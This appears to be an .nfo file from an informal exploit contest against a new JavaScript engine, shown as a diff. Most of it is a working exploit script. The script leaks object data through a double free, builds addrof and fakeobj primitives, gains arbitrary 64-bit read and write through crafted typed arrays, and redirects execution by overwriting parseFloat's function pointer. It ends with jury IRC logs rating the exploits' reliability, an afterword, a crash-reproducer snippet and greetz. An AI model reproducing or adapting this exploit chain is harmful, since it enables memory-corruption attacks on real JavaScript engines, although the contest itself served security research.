+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,
+];
+
+print("leaking JSObject data");
+// Parses the string into a bunch of uint32s
+for (var i = 0; i < 0x38; i += 4) {
+    var ptr = 0;
+    var val = '';
+    ptr = refill_0.slice(i, i + 4);
+
+    for (var j = 3; j >= 0; j--) {
+        var char = ptr.charCodeAt(j).toString(16);
+        if (char.length == 1)
+            char = '0' + char;
+        val += char;
+    }
+    val = parseInt(val, 16);
+    jsobj_leak_data[i / 4] = val;
+}
+
+var shape = toint64(jsobj_leak_data[(24 - 0x10) / 4], jsobj_leak_data[(28 - 0x10) / 4]);
+var prop = toint64(jsobj_leak_data[(32 - 0x10) / 4], jsobj_leak_data[(36 - 0x10) / 4]);
+var values = toint64(jsobj_leak_data[(56 - 0x10) / 4], jsobj_leak_data[(60 - 0x10) / 4]);
+
+print("shape @ " + shape.toString(16));
+print("prop @ " + prop.toString(16));
+print("values @ " + values.toString(16));
+
+print("freeing target twice and refilling with two JSObjects");
+refill_1 = 0;
+refill_1 = [0x1337, 0x1337];
+
+
+refill_0 = 0;
+refill_0 = [0x71717171];
+
+print("freeing object again and refilling with ArrayBuffer data");
+refill_1 = 0;
+// Need to free other JSObject size things as well to cause the
+// data to overlap and not the JSObject of the ArrayBuffer
+x = 0;
+y = 0;
+refill_1 = new Uint32Array(0x48 / 4);
+refill_1.fill(0x41414141);
+
+print("crafting JSObject with values pointing to spray buffer data");
+jsobj_leak_data[(56 - 0x10) / 4] += 0x2000;
+overlap_addr = values + 0x2000;
+
+for (var i = 4; i < 0x48 / 4; i++) {
+    refill_1[i] = jsobj_leak_data[i - 4];
+}
+refill_1[0] = 0x51414141;
+refill_1[1] = 0x00020d00;
+refill_1[2] = 0x41414141;
+refill_1[3] = 0x41414141;
+print("new values @ " + overlap_addr.toString(16));
+
+print("finding overlap");
+refill_0[0] = 0x1;
+
+var overlap_buf;
+var ovelap_index;
+for (var i = 0; i < spray.length; i++) {
+    for (var j = 0; j < (0x1000 / 4); j++) {
+
+        if (spray[i] && spray[i][j] == 0x1) {
+            overlap_buf = spray[i];
+            overlap_index = j;
+            print("overlap found");
+            print("spray index = " + i.toString(16));
+            print("index into buffer = " + j.toString(16));
+
+        }
+    }
+}
+
+print("setting up addrof and fakeobj");
+
+function addrof(obj) {
+    refill_0[0] = obj;
+    var ret = toint64(overlap_buf[overlap_index], overlap_buf[overlap_index + 1]);
+    refill_0[0] = 0;
+    return ret;
+}
+
+function fakeobj(addr) {
+    var addr_split = fromint64(addr);
+    overlap_buf[overlap_index] = addr_split[0];
+    overlap_buf[overlap_index + 1] = addr_split[1];
+    overlap_buf[overlap_index + 2] = 0xffffffff;
+    overlap_buf[overlap_index + 3] = 0xffffffff;
+    return refill_0[0];
+}
+
+test_addr = addrof(test);
+fake_test = fakeobj(test_addr);
+print("addr of [0x1337] = " + test_addr.toString(16));
+print("fakeobj(" + test_addr.toString(16) + ")[0] = " + fake_test[0].toString(16));
+
+print("crafting master and slave typed arrays");
+master_addr = addrof(master);
+slave_addr = addrof(slave);
+print("master addr = " + master_addr.toString(16));
+print("slave addr = " + slave_addr.toString(16));
+
+print("setting master->values to slave addr");
+// Point our crafted JSObject values to the address of master->values
+refill_1[(56) / 4] = (master_addr & 0xffffffff) + 56;
+refill_0[0] = slave;
+refill_1[(56) / 4] = overlap_addr;
+
+print("setting up arb read/write");
+
+function write64(addr, val) {
+    master[56 / 4] = (addr & 0xffffffff) >>> 0;
+    master[60 / 4] = addr / 0x100000000;
+
+    slave[0] = val & 0xffffffff;
+    slave[1] = val / 0x100000000;
+
+}
+
+function read64(addr) {
+    master[56 / 4] = (addr & 0xffffffff) >>> 0;
+    master[60 / 4] = addr / 0x100000000;
+
+    return slave[0] + slave[1] * 0x100000000;
+}
+
+test_values = read64(test_addr + 56);
+print("values of [0x1337] = " + test_values.toString(16));
+print("writing 0x1338 to values");
+write64(test_values, 0x1338);
+test_values_read = read64(test_values);
+print("read64(values) = " + test_values_read.toString(16));
+print("array access = " + test[0].toString(16));
+
+print("cleaning up");
+// Increment shape refcount to return cleanly
+write64(shape, read64(shape) + 1);
+// Increment test refcount as we created a fakeobj of it
+write64(test_addr, read64(test_addr) + 1);
+// Fixup corrupted list_head
+write64(addrof(refill_0) + 8, addrof(refill_0) + 8);
+
+print("jumping to 0x41414141");
+write64(addrof(parseFloat) + 0x30, 0x414141414141);
+parseFloat();
+
+print("DONE");
+
+
+
+
+========================================== snip ============================================
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀+===============+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<~qwertyoruiop>
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀The jury was handed this .nfo file up until this point in order to evaluate the submissions.
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Jury IRC logs provided (this time, an objective standard was used: niklasb's box):
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀+===============+
+
+[00:57:08]  niklasb:	ok unbuffer did it
+[00:59:21]  niklasb:	I measured 100% read write success for itszn in 32 and 64 bit (500 runs each) - an unsurprising result really
+[01:00:57]  niklasb:	and 100% for fire on 64-bit across 100 runs
+[01:01:35]  niklasb:	so both are very reliable
+[01:02:12]  @qwertyoruiop:	ok, both exploits are comparable but itszn's does 32 and 64
+[01:02:17]  @qwertyoruiop:	including 32 and 64 detection
+[01:03:32]  niklasb:	ok 100% across 500 runs for Fire30 also
+[01:03:48]  niklasb:	but I guess itszn wins and the exploit is also slightly faster
+[01:03:55]  @qwertyoruiop:	yeah
+[01:04:03]  @qwertyoruiop:	so if everyone is ok, itszn wins $500 and Fire30 wins $100
+[01:04:10]  niklasb:	ayyyye
+[01:04:16]  niklasb:	been fun qwertyoruiop 
+[01:04:23]  @qwertyoruiop:	:D
+[01:04:25]  itszn:	it was great!!
+[01:04:32]  ~as:	ayy very nice, congratulations to everyone, and thanks to qwertyoruiop for hosting this :) 
+[01:04:34]  @qwertyoruiop:	and yep niklasb another $500
+[01:04:35]  jointornot:	Congrats!
+[01:04:37]  itszn:	very fun exploit thanks for running it
+[01:04:50]  Tonyk7:	Congrats
+[01:04:57]  kiwidog:	<3
+[01:04:58]  Fire30:	yeah it was a fun contest :) 
+[01:05:05]  @qwertyoruiop:	anyone wants to write an afterword for the nfo?
+[01:05:06]  Fire30:	100 dollars straight into SPY puts lessgo
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀+===============+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<Afterword by ~qwertyoruiop>
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀This has truly been a great weekend! A new JavaScript engine is in town, and it's been a blast to see a few of the best hackers around give a shot at it for fun.
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀At the end of the day, it is not often that a piece of software with this degree of complexity can be poked at without any conflict of interest or potential money at stake, 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀so I am personally very happy about being able to see this happen. I'd like to extend my gratitude again to all the people who participated to this contest, it's been fun.
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀See you in #chat! 
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀+===============+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀References:
+[1]
+function f() {
+    var str = new String("1337");
+ 
+    var obj = new Int8Array(1337);
+    obj.toString = () => str;
+ 
+    var str2 = str;
+    print("HERE");
+    try {
+        str2 = str2 + obj;
+    } catch (e) {
+ 
+    }
+    b = [0x1338, 0x1338]
+    print(obj)
+}
+f();
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀+===============+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Greetz to all the idlers:
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+[~as          ] [ bkth       ] [ glem      ] [ key2       ] [ nocsi       ] [ Tonyk7   ] 
+[~mxms        ] [ blasty     ] [ goeo_     ] [ kilroy     ] [ nyx         ] [ treq     ] 
+[@argp        ] [ breadsticks] [ gopher9   ] [ kirb       ] [ oned4       ] [ ttdennis ] 
+[@qwertyoruiop] [ concerned__] [ greeny    ] [ kiwidog    ] [ ronyrus     ] [ ur0      ] 
+[+mbilker     ] [ Danglars   ] [ guy       ] [ kmart_     ] [ rpgwaiter   ] [ uroboro  ] 
+[ _rs         ] [ dotdot     ] [ h3adsh0tzz] [ likvidera  ] [ rpw         ] [ Verelic  ] 
+[ acez        ] [ DPR3       ] [ Hackintech] [ littlelailo] [ sbingner    ] [ wolf     ] 
+[ aldebaran   ] [ e99        ] [ HdkR      ] [ lyetz      ] [ Siguza      ] [ xyz      ] 
+[ AlexAltea   ] [ esser_t    ] [ itszn     ] [ n1ghtmadeon] [ SiSTRo      ] [ ZeZu     ] 
+[ AppleGeek   ] [ fehrwight  ] [ je        ] [ nafod      ] [ skooch      ] 
+[ atrson      ] [ Fire30     ] [ jointornot] [ ned        ] [ sol1d       ] 
+[ Baboon      ] [ fragile    ] [ K3        ] [ nikias     ] [ specterdev  ] 
+[ beakybal4   ] [ gabe_k     ] [ kathorga  ] [ niklasb    ] [ tbnz        ] 
+[ Bk0g        ] [ gaius      ] [ kbeckmann ] [ Nitron     ] [ tbodt       ] 
+
+
